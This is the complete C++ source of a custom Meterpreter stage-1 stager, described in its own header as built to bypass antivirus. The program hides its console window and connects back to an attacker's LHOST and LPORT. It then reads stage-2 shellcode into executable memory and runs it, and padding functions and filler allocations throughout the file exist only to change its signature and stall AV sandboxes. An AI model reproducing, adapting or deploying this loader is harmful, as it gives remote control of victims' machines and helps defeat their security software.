// Meterp-stage1.cpp :custom meterpreter stage 1 source code bypass AV.
// Author: Nathaniel Hirsch <nathaniel.hirsch@gmail.com>
//

#include "stdafx.h"

//garbage string creation function to fool av doubles every char in string
char* make_string1(char* s)
{ 
	char *result = (char *) malloc(strlen(s) * 2 + 1); 
	unsigned int i; 
	for (i = 0; i < strlen(s) * 2 + 1; i++)
	{ 
		result[i] = s[i / 2]; 
		result[i + 1] = s[i / 2]; 
	} 
	result[i] = '\0'; 
	return result; 
}

//garbage string creation function to fool av reverse string
char* make_string2(const char *t) 
{ 
	int length = strlen(t); 
	int i; 
	char* t2 = (char*)malloc((length + 1) * sizeof(char)); 
	for (i = 0; i<length; i++) 
	{ 
		t2[(length - 1) - i] = t[i]; 
	} 
	t2[length] = '\0'; 
	return t2; 
}

//set up the socket
void startsock() 
{ 
	WORD version = MAKEWORD(2, 2); 
	WSADATA data; 
	if (WSAStartup(version, &data) < 0) 
	{ 
		WSACleanup(); 
		exit(1); 
	} 
}

//garbage function to spin out time
void killit(int maxnum)
{
	int i;
	int randnum = maxnum + 500;

	while (randnum > maxnum)
		randnum = rand() % 5000;

	return;
}


//garbage string creation function to fool av
char* scratch_fill1()
{ 
	char *scratch = make_string1("This.function.is.certified.safe."); 
	scratch = strstr(scratch, ".");
	return scratch; 
}

//fail clean on error
void sockerror(SOCKET sock) 
{ 
	closesocket(sock); 
	WSACleanup(); 
	exit(1); 
}

//garbage string creation function to fool av
char* scratch_fill2()
{ 
	char scratch[200];
	char scratch2[100]; 
	strncpy(scratch, "There are no secrets in here. ", sizeof("There are no secrets in here. ")); 
	strncpy(scratch2, "But then again maybe there are. ", sizeof("But then again maybe there are. ")); 
	return make_string2(strcat(scratch, scratch2));
}


//get the stage 2 shellcode
int getit(SOCKET sock, char * stage1, int stage0)
{ 
	int data = 0; 
	int recieved = 0; 
	char * startb = stage1; 
	while (recieved < stage0) 
	{ 
		data = recv(sock, (char *)startb, stage0 - recieved, 0); 
		startb += data; 
		recieved += data; 
		if (data == SOCKET_ERROR) 
			sockerror(sock); 
	} 
	return recieved; 
}

//garbage string creation function to fool av
char* scratch_fill3()
{ 
	char scratch[100] = "this is a small string in all lower case."; 
	char *scratch2 = strupr(scratch); 
	return strlwr(scratch2); 
}

//make the connection to addr on port
SOCKET connect(char * addr, int port)
{ 
	struct hostent * ipaddr; 
	struct sockaddr_in sockin; 
	SOCKET sock; 
	sock = socket(AF_INET, SOCK_STREAM, 0); 
	if (sock == INVALID_SOCKET) 
		sockerror(sock); 

	ipaddr = gethostbyname(addr); 
	if (ipaddr == NULL) 
		sockerror(sock);

	memcpy(&sockin.sin_addr.s_addr, ipaddr->h_addr, ipaddr->h_length); 
	sockin.sin_family = AF_INET; 
	sockin.sin_port = htons(port); 
	if (connect(sock, (struct sockaddr *)&sockin, sizeof(sockin))) 
		sockerror(sock); 
	
	return sock; 
}


int _tmain(int argc, _TCHAR* argv[])
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	SOCKET sock;
	ULONG32 stage0;		//data received to create meterpreter stage 2
	char * stage1;		//stage 2 shellcode stored here
	void(*stage2)();	//function pointer to execute stage 2 shellcode
	int i;
	
	/* These are used for AV evasion, eating up AV sanbox time, modifying signature, etc*/

	char * scratch1[SCRATCH_SIZE];
	char * scratch2[SCRATCH_SIZE];
	char * scratch3[SCRATCH_SIZE];

	
	
	for (i = 0; i < SCRATCH_SIZE; ++i)						//filler
		scratch1[i] = (char *) malloc(200 * sizeof(char));	//filler

	startsock();

	killit(rand() % 5000);
		
	if (argc != 3)		//either edit stdafx.h to set LHOST:LPORT or call ./prog.exe host port
	{
		sock = connect(LHOST, LPORT);
	} 
	else
	{
		sock = connect((char *)argv[1], atoi((char *) argv[2]));
	}
	
	for (i = 0; i < SCRATCH_SIZE; ++i)							//filler
		scratch2[i] = (char *) malloc(rand() % 1000 + 1000);	//filler

	int data = recv(sock, (char *)&stage0, 4, 0);
	if (data != 4 || stage0 <= 0)
		sockerror(sock);

	stage1 = (char *) VirtualAlloc(0, stage0 + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	for (i = 0; i<SCRATCH_SIZE; ++i)							//filler
	{															//filler
		strncpy_s(scratch1[i], 100, scratch_fill1(), 100);		//filler
	}															//filler

	if (stage1 == NULL)
		sockerror(sock);

	stage1[0] = 0xBF;
	memcpy(stage1 + 1, &sock, 4);
	
	for (i = 0; i < SCRATCH_SIZE; ++i)							//filler
		scratch3[i] = (char *) malloc(rand() % 5000 + 1000);	//filler

	for (i = 0; i<SCRATCH_SIZE; ++i)							//filler
	{															//filler
		strncpy_s(scratch2[i], 100, scratch_fill2(), 100);		//filler
	}															//filler

	data = getit(sock, stage1 + 5, stage0);
	stage2 = (void(*)())stage1;
	stage2();
	
	for (i = 0; i < SCRATCH_SIZE; ++i)							//filler
	{															//filler
		strncpy_s(scratch3[i], 100, scratch_fill3(), 100);		//filler
	}															//filler

	return 0;
}

